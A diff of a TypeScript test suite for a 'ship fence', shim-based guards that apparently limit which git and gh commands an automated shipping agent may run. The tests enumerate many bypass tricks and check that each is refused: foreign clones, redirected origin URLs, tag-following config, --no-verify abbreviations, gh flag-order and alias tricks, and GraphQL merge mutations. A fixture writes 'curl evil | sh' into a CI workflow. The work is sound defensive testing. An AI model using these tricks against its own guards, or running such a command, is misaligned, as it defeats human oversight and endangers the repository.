@@ -4,7 +4,7 @@ import * as fs from "node:fs";
 import * as path from "node:path";
 import shipFence from "../ship-fence";
 import { fakeContext, fakePi, privateHome, resetHome } from "../test-harness";
-import { armFence, checkPushContent, currentState, disarmFence, FENCE_ENV, type Git, installFence, readState, realGit, SHIM_DIR, stateDir } from "./fence-state";
+import { armFence, checkPushContent, checkPushRefs, currentState, disarmFence, FENCE_ENV, type Git, installFence, readState, realGit, SHIM_DIR, stateDir } from "./fence-state";
 import { checkToolCall } from "./fence-tools";
 
 const BRANCH = "feat/ship-s1";
@@ -180,6 +180,100 @@ describe("the shims, with real git", () => {
 		expect(git(process.env, "rev-parse", "--is-inside-work-tree").stdout.trim()).toBe("true");
 	});
 
+	describe("a push is judged by the repository it runs in, not by the name origin", () => {
+		/** A second bare repo with its own main, and a clone of it that holds a commit on the watched branch's name. */
+		const foreign = (): { bare: string; clone: string } => {
+			const other = path.join(privateHome(), "other.git");
+			const seed = path.join(privateHome(), "seed");
+			execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", other]);
+			fs.mkdirSync(seed);
+			sh(seed, "init", "--quiet", "-b", "main");
+			sh(seed, "remote", "add", "origin", other);
+			write(path.join(seed, "src/b.ts"), "export const b = 1;\n");
+			sh(seed, "add", "-A");
+			sh(seed, "commit", "--quiet", "-m", "init");
+			sh(seed, "push", "--quiet", "origin", "main");
+			const clone = path.join(privateHome(), "x");
+			sh(privateHome(), "clone", "--quiet", other, clone);
+			sh(clone, "switch", "--quiet", "-c", BRANCH);
+			write(path.join(clone, "src/b.ts"), "export const b = 2;\n");
+			sh(clone, "commit", "--quiet", "-am", "work");
+			return { bare: other, clone };
+		};
+		const heads = (bareDir: string) => spawnSync("git", ["--git-dir", bareDir, "for-each-ref", "--format=%(refname)", "refs/heads"], { env: { ...process.env, PATH: savedPath }, encoding: "utf8" }).stdout;
+
+		test("a clone of another repository is refused, from the armed repo with -C and from inside the clone, and nothing is sent", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			const { bare: other, clone } = foreign();
+			fs.symlinkSync(clone, path.join(privateHome(), "link"));
+			for (const [cwd, args] of [[repo, ["-C", clone]], [clone, []], [repo, ["-C", path.join(privateHome(), "link")]], [repo, ["-C", clone, "-C", "src"]]] as const) {
+				const push = gitAt(cwd, process.env, ...args, "push", "origin", BRANCH);
+				expect(push.status, `${cwd} ${args.join(" ")}: ${push.stderr}`).toBe(1);
+				expect(push.stderr).toContain("ship fence");
+				expect(push.stderr).toContain("armed");
+			}
+			expect(heads(other)).not.toContain(BRANCH);
+		});
+
+		test("a second clone of the same origin is another repository too", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			const mate = teammate();
+			const push = gitAt(mate, process.env, "push", "origin", BRANCH);
+			expect(push.status).toBe(1);
+			expect(push.stderr).toContain("ship fence");
+			expect(originHas(BRANCH)).toBe("");
+		});
+
+		test("the armed repository and its linked worktrees push", () => {
+			sh(repo, "switch", "--quiet", "main");
+			const wt = path.join(privateHome(), "projects", "app-wt");
+			sh(repo, "worktree", "add", "--quiet", wt, BRANCH);
+			armFence({ pushBranch: BRANCH, root: repo });
+			write(path.join(wt, "src/a.ts"), "export const a = 2;\n");
+			sh(wt, "commit", "--quiet", "-am", "from the worktree");
+			const fromWorktree = gitAt(wt, process.env, "push", "--quiet", "origin", BRANCH);
+			expect(fromWorktree.status, fromWorktree.stderr).toBe(0);
+			expect(originHas(BRANCH)).toBe(sh(wt, "rev-parse", "HEAD").trim());
+			write(path.join(wt, "src/a.ts"), "export const a = 3;\n");
+			sh(wt, "commit", "--quiet", "-am", "again");
+			const fromRepo = git(process.env, "-C", wt, "push", "--quiet", "origin", BRANCH);
+			expect(fromRepo.status, fromRepo.stderr).toBe(0);
+			const fromMain = git(process.env, "push", "--quiet", "origin", `${BRANCH}:${BRANCH}`);
+			expect(fromMain.status, fromMain.stderr).toBe(0);
+		});
+
+		test("a state armed from a linked worktree lets the main repository push too", () => {
+			const wt = path.join(privateHome(), "projects", "app-wt");
+			sh(repo, "worktree", "add", "--quiet", "-b", "feat/wt", wt);
+			armFence({ pushBranch: "feat/wt", root: wt });
+			expect(git(process.env, "push", "--quiet", "origin", "feat/wt").status).toBe(0);
+			expect(gitAt(wt, process.env, "push", "--quiet", "origin", "feat/wt").status).toBe(0);
+		});
+
+		test("origin pointed elsewhere since arming is refused", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			const { bare: other } = foreign();
+			sh(repo, "remote", "set-url", "origin", other);
+			const push = git(process.env, "push", "origin", BRANCH);
+			expect(push.status).toBe(1);
+			expect(push.stderr).toContain("origin's URL");
+			expect(heads(other)).not.toContain(BRANCH);
+			expect(originHas(BRANCH)).toBe("");
+		});
+
+		test("a state file from before the URL was recorded refuses the push and says to run /ship again", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			const file = process.env[FENCE_ENV] as string;
+			const old = JSON.parse(fs.readFileSync(file, "utf8")) as Record<string, unknown>;
+			delete old.originUrl;
+			fs.writeFileSync(file, JSON.stringify(old));
+			const push = git(process.env, "push", "origin", BRANCH);
+			expect(push.status).toBe(1);
+			expect(push.stderr).toContain("run /ship again");
+			expect(originHas(BRANCH)).toBe("");
+		});
+	});
+
 	test("a push carrying a change to a protected file is refused, however the file was edited; one the base brought passes", () => {
 		armFence({ pushBranch: BRANCH, root: repo });
 		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
@@ -286,6 +380,20 @@ describe("the shims, with real git", () => {
 		expect(push.status).toBe(1);
 		expect(push.stderr).toContain("would change .github/workflows/ci.yml");
 		expect(originHas(BRANCH)).toBe("");
+	});
+
+	test("a push that git would land on another ref of origin is refused, and the dry run names that ref", () => {
+		armFence({ pushBranch: BRANCH, root: repo });
+		// origin holds a branch named `refs/heads/<branch>`: with the watched branch not there yet, git matches the push to it by its tail.
+		sh(repo, "push", "--quiet", "origin", `HEAD:refs/heads/refs/heads/${BRANCH}`);
+		const first = sh(repo, "rev-parse", "HEAD").trim();
+		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
+		sh(repo, "commit", "--quiet", "-am", "next");
+		const push = git(process.env, "push", "origin", BRANCH);
+		expect(push.status).toBe(1);
+		expect(push.stderr).toContain(`refs/heads/refs/heads/${BRANCH}`);
+		expect(originHas(BRANCH)).toBe("");
+		expect(originHas(`refs/heads/${BRANCH}`)).toBe(first);
 	});
 
 	test("moving a protected file away is a change to it", () => {
@@ -499,6 +607,38 @@ describe("the shims, with real git", () => {
 		const down: Git = (dir, ...args) => (args[0] === "ls-remote" ? { code: 128, out: "" } : realGit(dir, ...args));
 		expect(checkPushContent(repo, [BRANCH], currentState(), down)).toContain("origin");
 		expect(checkPushContent(repo, [BRANCH], { ...currentState(), pushBranch: null })).toContain("pushes nothing");
+	});
+
+	test("what a push would send is read off git's dry-run listing: the branch alone goes, a tag or another ref does not, and a listing that can't be read is no yes", () => {
+		armFence({ pushBranch: BRANCH, root: repo });
+		const state = currentState();
+		const listing = ["push", "--dry-run", "--porcelain", "--no-verify", "origin", BRANCH];
+		const says = (out: string, code = 0, err = ""): Git => () => ({ code, out, err });
+		const sent = (...lines: string[]) => `To /x/remote.git\n${lines.join("\n")}\nDone\n`;
+		const own = `refs/heads/${BRANCH}:refs/heads/${BRANCH}`;
+		for (const line of [`*\t${own}\t[new branch]`, ` \t${own}\t07f99e7..8401aad`, `+\t${own}\t07f99e7...8401aad (forced update)`, `=\t${own}\t[up to date]`, `!\t${own}\t[rejected] (non-fast-forward)`]) {
+			expect(checkPushRefs(repo, listing, state, says(sent(line), line.startsWith("!") ? 1 : 0)), line).toBeNull();
+		}
+		const tags = checkPushRefs(repo, listing, state, says(sent(`*\t${own}\t[new branch]`, "*\trefs/tags/v1:refs/tags/v1\t[new tag]", "*\trefs/tags/v2:refs/tags/v2\t[new tag]")));
+		expect(tags).toContain("refs/tags/v1, refs/tags/v2");
+		expect(tags).toContain(`git push --no-follow-tags origin ${BRANCH}`);
+		expect(tags).not.toContain("This is final");
+		// With --no-follow-tags already on the line, a tag is no config's doing: that is final.
+		const stillTagged = checkPushRefs(repo, [...listing.slice(0, 4), "--no-follow-tags", ...listing.slice(4)], state, says(sent(`*\t${own}\t[new branch]`, "*\trefs/tags/v1:refs/tags/v1\t[new tag]")));
+		expect(stillTagged).toContain("refs/tags/v1");
+		expect(stillTagged).toContain("This is final");
+		const other = checkPushRefs(repo, listing, state, says(sent(`*\t${own}\t[new branch]`, "*\trefs/heads/other:refs/heads/other\t[new branch]", "*\trefs/tags/v1:refs/tags/v1\t[new tag]")));
+		expect(other).toContain("refs/heads/other, refs/tags/v1");
+		expect(other).toContain("This is final");
+		expect(checkPushRefs(repo, listing, state, says(sent("-\t:refs/heads/other\t[deleted]")))).toContain("refs/heads/other");
+		for (const out of ["", "Done\n", "To /x/remote.git\nDone\n", "fatal: nope\n"]) {
+			const none = checkPushRefs(repo, listing, state, says(out, 128, "fatal: unable to access 'x'\n"));
+			expect(none, JSON.stringify(out)).toContain("can't tell what the push would send");
+			expect(none).toContain("unable to access");
+			expect(none).not.toContain("This is final");
+		}
+		expect(checkPushRefs(repo, listing, state, says("", 1))).toContain("exit 1");
+		expect(checkPushRefs(repo, listing, { ...state, pushBranch: null }, says(sent(`*\t${own}\t[new branch]`)))).toContain("pushes nothing");
 	});
 
 	test("the fetch a refusal names comes from origin's own listing: its default branch by name, HEAD when none is named, a shell-safe word either way", () => {
@@ -783,6 +923,291 @@ describe("the shims, with real git", () => {
 				if (r.status !== 0 || !r.stdout.startsWith("stub gh")) failed.push(`gh ${args.join(" ")} => ${r.status ?? r.signal ?? r.error?.message}: ${r.stderr.trim().split("\n")[0]}`);
 			}
 			expect(failed).toEqual([]);
+			expect(originHas(BRANCH)).toBe(sh(repo, "rev-parse", "HEAD").trim());
+		}, 30_000);
+
+		/** gh after the shims on PATH, standing in for the real one: a line in ran.log is proof that gh itself ran. */
+		const stubGh = (): void => {
+			const stubs = path.join(privateHome(), "stubs");
+			stand(path.join(stubs, "gh"));
+			process.env.PATH = [SHIM_DIR, stubs, ...(process.env.PATH ?? "").split(path.delimiter).filter(entry => entry !== SHIM_DIR)].join(path.delimiter);
+		};
+		const runGh = (...args: string[]) => spawnSync("gh", args, { cwd: repo, env: process.env, encoding: "utf8" });
+		const refuseGh = (...args: string[]): void => {
+			const r = runGh(...args);
+			if (r.status !== 1 || !r.stderr.includes("ship fence")) holes.push(`gh ${args.join(" ")} => ${r.status}: ${r.stderr.trim().split("\n")[0]}`);
+		};
+		const marker = "<!-- omp-ship -->";
+		/** How many gh runs the stub logged: a body with a newline in it spreads over lines, so only the stub's own lines count. */
+		const ghRuns = (): number => ran().filter(line => line.startsWith("gh ")).length;
+
+		test("gh api sends the last of -X and --method, so a GET in front of a PUT is a PUT", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			stubGh();
+			const merge = "repos/o/r/pulls/5/merge";
+			for (const args of [
+				["api", "-X", "GET", "--method", "PUT", merge], ["api", "--method", "GET", "-X", "PUT", merge], ["api", "-X", "GET", "-X", "PUT", merge], ["api", "--method=GET", "--method=PUT", merge],
+				["api", "-XGET", "-XPUT", merge], ["api", "-X=GET", "-X=PUT", merge], ["api", merge, "-X", "GET", "-X", "PUT"], ["api", "-X", "GET", "--method=DELETE", "repos/o/r/git/refs/heads/feat"],
+			]) refuseGh(...args);
+			expect(holes).toEqual([]);
+			expect(ran()).toEqual([]);
+			// The last method decides the other way too: a PUT in front of a GET reads.
+			for (const args of [["api", "-X", "PUT", "-X", "GET", "repos/o/r/pulls/5"], ["api", "--method=PUT", "-XGET", "repos/o/r/pulls/5"], ["api", "-X=PUT", "--method", "GET", "repos/o/r/pulls/5"]]) {
+				expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
+			}
+			expect(ran()).toHaveLength(3);
+		}, 30_000);
+
+		test("a flag in front of gh's command words takes the word after it, so the command gh runs is not the one the fence would see", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			stubGh();
+			for (const args of [
+				// `-t x` is merge's --subject, `-b x` is review's --body, `-c x` is close's --comment: cobra finds the subcommand past them.
+				["pr", "-t", "x", "merge", "5"], ["pr", "--subject", "x", "merge", "5"], ["pr", "-b", "x", "review", "5", "--approve"], ["pr", "-c", "x", "close", "5"], ["pr", "-t", "x", "merge", "-R", "o/r", "5"],
+				// `-p pr` is api's preview flag twice, which keeps `pr pr` where the command words would be.
+				["-p", "pr", "-p", "pr", "api", "repos/o/r/pulls/5/merge", "-X", "PUT"], ["-p", "pr", "-p", "pr", "api", "-X", "POST", "repos/o/r/pulls/5/reviews", "-f", "event=APPROVE"],
+				["--jq", "x", "pr", "merge", "5"], ["-q", "pr", "pr", "merge", "5"],
+				// cobra skips an empty word and a lone `-` on its way to the command, and passes them on as its words.
+				["pr", "-", "merge", "-R", "o/r"], ["pr", "", "merge"], ["pr", "--repo", "--", "-", "lock", "5"],
+				// A base set behind a flag whose value could be taken for it: `-b -R` is a body, and `-B=main` the base.
+				["pr", "edit", "7", "-b", "-R", "-B=main"], ["pr", "edit", "7", "--base", "main"], ["pr", "edit", "7", "-Bmain"],
+			]) refuseGh(...args);
+			expect(holes).toEqual([]);
+			expect(ran()).toEqual([]);
+			// The repo flags may stand anywhere gh reads them.
+			for (const args of [["-R", "o/r", "pr", "view", "7"], ["pr", "-R", "o/r", "view", "7"], ["--repo=o/r", "pr", "view", "7"], ["-Ro/r", "pr", "view", "7"], ["pr", "view", "7", "-R", "o/r"], ["--hostname", "github.com", "api", "user"]]) {
+				expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
+			}
+			expect(ran()).toHaveLength(6);
+		}, 30_000);
+
+		test("gh pr create opens a draft only when the last --draft or -d is a true bool, as strconv.ParseBool reads it; a flag's value can't be the --draft that follows it", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			stubGh();
+			const make = ["--title", "t", "--body", "b"];
+			for (const args of [
+				...["0", "f", "F", "false", "False", "FALSE", "bogus", ""].map(v => ["pr", "create", `--draft=${v}`, ...make]),
+				...["false", "0", "f"].map(v => ["pr", "create", `-d=${v}`, ...make]),
+				["pr", "create", "--draft", "--draft=false", ...make], ["pr", "create", "-d", "-d=0", ...make], ["pr", "create", "--draft", "-d=f", ...make], ["pr", "create", ...make, "--draft=0", "--draft=F"],
+				// A value flag reads the next word as its value, a dash or not: none of these is a --draft.
+				["pr", "create", "-tdraft", "--body", "b"], ["pr", "create", "-t", "--draft", "--body", "b"], ["pr", "create", "--title", "--draft", "--body", "b"], ["pr", "create", "-b", "--draft", "--title", "t"],
+				["pr", "create", "--title=t", "--body", "--draft"], ["pr", "create", "-Bd", ...make], ["pr", "create", "-rd", ...make], ["pr", "create", "-fl", "d", ...make],
+				["pr", "create", ...make], ["pr", "create", "--draft", "--no-such-flag", ...make],
+			]) refuseGh(...args);
+			expect(holes).toEqual([]);
+			expect(ran()).toEqual([]);
+			const allowed = [
+				...["", "=true", "=1", "=t", "=T", "=TRUE", "=True"].map(v => ["pr", "create", `--draft${v}`, ...make]),
+				["pr", "create", "-d", ...make], ["pr", "create", "-d=true", ...make], ["pr", "create", "--draft=false", "--draft", ...make], ["pr", "create", "-d=0", "-d", ...make], ["pr", "create", "-fd"], ["pr", "create", "-d", "-f"],
+				["pr", "create", "--repo", "o/r", "--draft", "--head", "b", ...make], ["-R", "o/r", "pr", "create", "--draft", "--fill"], ["pr", "create", "-tx", "-b", "y", "-B", "main", "-d"], ["pr", "create", "--title", "--draft", "--draft", "--body", "b"],
+			];
+			for (const args of allowed) expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
+			expect(ran()).toHaveLength(allowed.length);
+		}, 30_000);
+
+		test("a GraphQL query read from a file is refused whichever way the flag is spelled, and a thread may still be resolved", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			stubGh();
+			const file = path.join(privateHome(), "q.gql");
+			write(file, 'mutation { mergePullRequest(input:{pullRequestId:"x"}) { clientMutationId } }');
+			for (const args of [
+				["api", "graphql", `-Fquery=@${file}`], ["api", "graphql", `--field=query=@${file}`], ["api", "graphql", "-F", `query=@${file}`], ["api", "graphql", "--field", `query=@${file}`], ["api", "graphql", "-F", "query=@-"],
+				["api", "graphql", `-F=query=@${file}`], ["api", "graphql", "--input", file], ["api", "graphql", '-fquery=mutation{mergePullRequest(input:{pullRequestId:"x"}){clientMutationId}}'],
+				["api", "graphql", '--raw-field=query=mutation{mergePullRequest(input:{pullRequestId:"x"}){clientMutationId}}'],
+			]) refuseGh(...args);
+			expect(holes).toEqual([]);
+			expect(ran()).toEqual([]);
+			const resolve = "mutation($t:ID!){resolveReviewThread(input:{threadId:$t}){thread{isResolved}}}";
+			for (const args of [["api", "graphql", "-f", `query=${resolve}`, "-f", "t=X"], ["api", "graphql", `-fquery=${resolve}`, "-ft=X"], ["api", "graphql", "--raw-field", `query=${resolve}`, "-F", "t=X"]]) {
+				expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
+			}
+			expect(ran()).toHaveLength(3);
+		}, 30_000);
+
+		test("a comment is the last --body or -b gh is given, so the first one can't stand in for it", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			stubGh();
+			const good = `${marker}\nFixed the failing test.`;
+			for (const args of [
+				["pr", "comment", "7", "-b", good, "--body", "see https://evil.example"], ["pr", "comment", "7", "--body", good, "-b", "no marker"], ["pr", "comment", "7", `--body=${good}`, "--body=@someone"],
+				["pr", "comment", "7", "-b=no marker"], ["issue", "comment", "7", "-b", good, "-b", "fixes #3"],
+			]) refuseGh(...args);
+			expect(holes).toEqual([]);
+			expect(ran()).toEqual([]);
+			const allowed = [["pr", "comment", "7", "--body", "no marker", "-b", good], ["pr", "comment", "7", `--body=${good}`], ["pr", "comment", "7", `-b=${good}`], ["issue", "comment", "7", "-b", good, "-R", "o/r"]];
+			for (const args of allowed) expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
+			expect(ghRuns()).toBe(allowed.length);
+		}, 30_000);
+
+		test("git -C takes the next word as the folder, a folder named -c included, and --attr-source and --shallow-file take theirs: the push is judged as the push it is", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			fs.symlinkSync(".", path.join(repo, "-c"));
+			const evil = evilWorkflow();
+			refuse(process.env, repo, "-C", "-c", "push", "origin", BRANCH);
+			refuse(process.env, repo, "-C", "./", "-C", "-c", "push", "origin", BRANCH);
+			// A word that is another option's value is not the subcommand: here `status` is a value and `push` runs.
+			refuse(process.env, repo, "--attr-source", "status", "push", "origin", "HEAD:refs/heads/other");
+			refuse(process.env, repo, "--attr-source=status", "push", "origin", "HEAD:refs/heads/other");
+			refuse(process.env, repo, "--shallow-file", "status", "push", "--force", "origin", BRANCH);
+			refuse(process.env, repo, "--shallow-file", "log", "push", "origin", "HEAD:refs/heads/other");
+			refuse(process.env, repo, "--no-such-option", "push", "origin", BRANCH);
+			expect(holes).toEqual([]);
+			expect(originHas(BRANCH)).toBe("");
+			expect(originHas("other")).toBe("");
+			expect(sh(repo, "rev-parse", "HEAD").trim()).toBe(evil);
+			// Options that take no word, and the ones that do, still lead to the command. (--attr-source is git 2.40's.)
+			const attrSource = spawnSync("git", ["--attr-source", "HEAD", "version"], { env: { ...process.env, PATH: savedPath } }).status === 0;
+			for (const args of [["--no-pager", "log", "-1"], ["--no-optional-locks", "status", "-s"], ["-P", "log", "-1"], ["-C", "src", "-c", "color.ui=never", "--no-pager", "status", "-s"], ...(attrSource ? [["--attr-source", "HEAD", "status", "-s"]] : []), ["--shallow-file", "x", "status", "-s"]]) {
+				const r = git(process.env, ...args);
+				expect(r.stderr, args.join(" ")).not.toContain("ship fence");
+				expect(r.status, args.join(" ")).toBe(0);
+			}
+		}, 30_000);
+
+		test("a push that would also send a tag is refused, however git came to follow tags; --no-follow-tags sends the branch alone", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			// The user's own setting, written outside the fence, and an annotated tag the push would carry along.
+			sh(repo, "config", "push.followTags", "true");
+			sh(repo, "tag", "-a", "v9.9.9", "-m", "release");
+			const tags = () => spawnSync("git", ["--git-dir", bare(), "for-each-ref", "--format=%(refname)", "refs/tags"], { env: { ...process.env, PATH: savedPath }, encoding: "utf8" }).stdout.trim();
+			const push = git(process.env, "push", "origin", BRANCH);
+			expect(push.status).toBe(1);
+			expect(push.stderr).toContain("refs/tags/v9.9.9");
+			expect(push.stderr).toContain("--no-follow-tags");
+			expect(tags()).toBe("");
+			expect(originHas(BRANCH)).toBe("");
+			// The settings that do the same are refused where they are set, or for one push.
+			refuse(process.env, repo, "config", "push.followTags", "true");
+			refuse(process.env, repo, "config", "--add", "push.followTags", "true");
+			refuse(process.env, repo, "config", "set", "push.followTags", "true");
+			refuse(process.env, repo, "config", "--global", "push.followTags", "true");
+			refuse(process.env, repo, "-c", "push.followTags=true", "push", "origin", BRANCH);
+			refuse({ ...process.env, GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "push.followTags", GIT_CONFIG_VALUE_0: "true" }, repo, "push", "origin", BRANCH);
+			refuse({ ...process.env, GIT_CONFIG_PARAMETERS: "'push.followTags'='true'" }, repo, "push", "origin", BRANCH);
+			refuse({ ...process.env, TAG_ON: "true" }, repo, "--config-env=push.followTags=TAG_ON", "push", "origin", BRANCH);
+			// A tag or another ref named on the line was refused already.
+			refuse(process.env, repo, "push", "origin", "v9.9.9");
+			refuse(process.env, repo, "push", "origin", `${BRANCH}:refs/tags/v1`);
+			expect(holes).toEqual([]);
+			expect(tags()).toBe("");
+			expect(originHas(BRANCH)).toBe("");
+			// The branch alone goes; so does a push where a lightweight tag, which --follow-tags leaves, is the only other thing there.
+			expect(git(process.env, "push", "--quiet", "--no-follow-tags", "origin", BRANCH).status).toBe(0);
+			expect(originHas(BRANCH)).toBe(sh(repo, "rev-parse", "HEAD").trim());
+			expect(tags()).toBe("");
+			sh(repo, "tag", "-d", "v9.9.9");
+			sh(repo, "tag", "v-light");
+			write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
+			sh(repo, "commit", "--quiet", "-am", "next");
+			expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
+			expect(originHas(BRANCH)).toBe(sh(repo, "rev-parse", "HEAD").trim());
+			expect(tags()).toBe("");
+		}, 30_000);
+
+		test("git remote's subcommand follows its options: -v and --verbose in front change nothing", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			const url = (): string => sh(repo, "config", "--get", "remote.origin.url").trim();
+			const was = url();
+			const other = path.join(privateHome(), "other.git");
+			for (const args of [
+				["remote", "-v", "set-url", "origin", other], ["remote", "--verbose", "set-url", "origin", other], ["remote", "-v", "add", "evil", other], ["remote", "--verbose", "rename", "origin", "gone"],
+				["remote", "-v", "remove", "origin"], ["remote", "-v", "rm", "origin"], ["remote", "-vv", "set-url", "origin", other], ["remote", "--verb", "set-url", "origin", other], ["remote", "--", "set-url", "origin", other],
+				["remote", "-v", "set-url", "--push", "origin", other],
+			]) refuse(process.env, repo, ...args);
+			expect(holes).toEqual([]);
+			expect(url()).toBe(was);
+			expect(sh(repo, "remote").trim()).toBe("origin");
+			for (const args of [["remote"], ["remote", "-v"], ["remote", "--verbose"], ["remote", "-v", "show", "origin"], ["remote", "get-url", "origin"], ["remote", "-v", "update"], ["remote", "set-head", "origin", "--auto"]]) {
+				const r = git(process.env, ...args);
+				expect(r.stderr, args.join(" ")).not.toContain("ship fence");
+				expect(r.status, args.join(" ")).toBe(0);
+			}
+		}, 30_000);
+
+		test("--no-verify is refused in every spelling git reads for it, on commit, merge and pull, and a message that holds an n is not -n", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			sh(repo, "switch", "--quiet", "-c", "side");
+			write(path.join(repo, "src/side.ts"), "export const side = 1;\n");
+			sh(repo, "add", "-A");
+			sh(repo, "commit", "--quiet", "-m", "side work");
+			sh(repo, "switch", "--quiet", BRANCH);
+			write(path.join(repo, "src/main.ts"), "export const main = 1;\n");
+			sh(repo, "add", "-A");
+			sh(repo, "commit", "--quiet", "-m", "branch work");
+			const hooks = path.join(repo, ".git", "hooks");
+			const hook = (name: string, code: number): void => {
+				write(path.join(hooks, name), `#!/bin/sh\nexit ${code}\n`);
+				fs.chmodSync(path.join(hooks, name), 0o755);
+			};
+			hook("pre-commit", 1);
+			hook("pre-merge-commit", 1);
+			const head = (): string => sh(repo, "rev-parse", "HEAD").trim();
+			const before = head();
+			for (const args of [
+				["commit", "--allow-empty", "-m", "x", "--no-verify"], ["commit", "--allow-empty", "-m", "x", "--no-verif"], ["commit", "--allow-empty", "-m", "x", "--no-veri"], ["commit", "--allow-empty", "--no-veri", "-m", "x"],
+				["commit", "--allow-empty", "-nm", "x"], ["commit", "--allow-empty", "-n", "-m", "x"], ["commit", "-anm", "x"], ["commit", "--allow-empty", "-mx", "-n"], ["commit", "--allow-empty", "-m", "x", "-sn"],
+				["merge", "--no-ff", "--no-edit", "--no-verify", "side"],
+				["pull", "--no-rebase", "--no-ff", "--no-edit", "--no-verify", ".", "side"], ["pull", "--no-rebase", "--no-ff", "--no-edit", "--no-verif", ".", "side"], ["pull", "--no-rebase", "--no-ff", "--no-edit", "--no-veri", ".", "side"],
+			]) refuse(process.env, repo, ...args);
+			expect(holes).toEqual([]);
+			expect(head()).toBe(before);
+			expect(fs.existsSync(path.join(repo, ".git", "MERGE_HEAD"))).toBe(false);
+			// Without the flag the hooks run and stop the commit and the merge: git's own refusal, not the fence's.
+			const plain = git(process.env, "commit", "--allow-empty", "-m", "x");
+			expect(plain.status).toBe(1);
+			expect(plain.stderr).not.toContain("ship fence");
+			const merge = git(process.env, "merge", "--no-ff", "--no-edit", "side");
+			expect(merge.status).toBe(1);
+			expect(merge.stderr).not.toContain("ship fence");
+			sh(repo, "merge", "--abort");
+			expect(head()).toBe(before);
+			// A message or a file that holds an n is no -n, and a message that is the flag's own name is only a message.
+			hook("pre-commit", 0);
+			for (const args of [["commit", "--allow-empty", "-mnew"], ["commit", "--allow-empty", "-m", "--no-verify"], ["commit", "--allow-empty", "-m", "-n"], ["commit", "--allow-empty", "--message=--no-verify"], ["commit", "--allow-empty", "-am", "n"], ["commit", "--allow-empty", "-Fsrc/a.ts"], ["commit", "--allow-empty", "--author=Name <n@x.y>", "-m", "x"]]) {
+				const r = git(process.env, ...args);
+				expect(r.stderr, args.join(" ")).not.toContain("ship fence");
+				expect(r.status, `${args.join(" ")}: ${r.stderr}`).toBe(0);
+			}
+		}, 30_000);
+
+		test("gh runs only what a watch needs: the commands that got past the list of refused ones, and gh's other names for them, are refused and send nothing", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			stubGh();
+			const make = ["--title", "t", "--body", "b", "-R", "o/r", "--head", "o:feat", "--base", "main"];
+			for (const args of [
+				// `gh pr new` is `gh pr create`: a ready PR when it isn't a draft. `gh issue close` closes a PR by its number.
+				["pr", "new", ...make], ["pr", "new", ...make, "--draft=false"], ["pr", "-R", "o/r", "new", ...make], ["issue", "close", "5", "-R", "o/r"], ["issue", "reopen", "6", "-R", "o/r"],
+				["pr", "revert", "7", "-R", "o/r"], ["pr", "update-branch", "8", "-R", "o/r"], ["repo", "deploy-key", "add", "k.pub", "--allow-write", "-R", "o/r"], ["repo", "create", "evil-repo", "--public"], ["repo", "new", "evil-repo", "--public"],
+				["label", "create", "bug"], ["gist", "create", "--public", "notes.txt"], ["gist", "new", "notes.txt"], ["issue", "develop", "9", "-b", "main", "--name", "x"],
+				// The rest of the groups, by their short names too.
+				["pr", "co", "5"], ["co", "5"], ["issue", "new", "--title", "t"], ["release", "new", "v1"], ["repo", "ls"], ["secret", "list"], ["ext", "install", "x/y"], ["cs", "ls"], ["rs", "ls"], ["config", "get", "editor"], ["browse", "-n"],
+			]) refuseGh(...args);
+			expect(holes).toEqual([]);
+			expect(ran()).toEqual([]);
+			const allowed = [
+				["pr", "new", "--draft", ...make], ["pr", "ls"], ["run", "ls"], ["issue", "ls"], ["run", "watch", "123"], ["workflow", "list"], ["workflow", "view", "ci.yml"], ["release", "list"], ["release", "view"], ["label", "list"], ["cache", "list"],
+				["search", "prs", "x"], ["status"], ["auth", "token", "-u", "blindx-tony-do"], ["version"], ["help", "pr"],
+			];
+			for (const args of allowed) expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
+			expect(ghRuns()).toBe(allowed.length);
+		}, 30_000);
+
+		test("the same shims still run what was always allowed", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			stubGh();
+			const allowed = [
+				["pr", "view", "7"], ["pr", "checks", "7"], ["pr", "comment", "7", "--body", `${marker}\nDone.`], ["api", "repos/o/r/pulls/7/comments"], ["api", "repos/o/r/issues/7/comments", "-f", `body=${marker}\nDone.`],
+				["api", "-X", "POST", "repos/o/r/pulls/7/comments/9/replies", "-f", `body=${marker}\nDone.`], ["api", "--method", "POST", "repos/o/r/pulls/7/requested_reviewers", "-f", "reviewers[]=x"], ["api", "--method", "GET", "repos/o/r/pulls/7"],
+				["api", "repos/o/r/collaborators/x/permission", "--jq", ".permission"], ["api", "user", "--jq", ".login"], ["api", "graphql", "-f", 'query=query($o:String!){repository(owner:$o,name:"r"){id}}', "-f", "o=x", "-F", "number=7"],
+				["pr", "view", "7", "--json", "state", "-R", "o/r"], ["pr", "list", "--repo", "o/r", "--head", BRANCH, "--state", "open", "--json", "number,url"], ["pr", "create", "--repo", "o/r", "--draft", "--head", BRANCH, "--title", "t", "--body", "b"],
+			];
+			for (const args of allowed) expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
+			expect(ghRuns()).toBe(allowed.length);
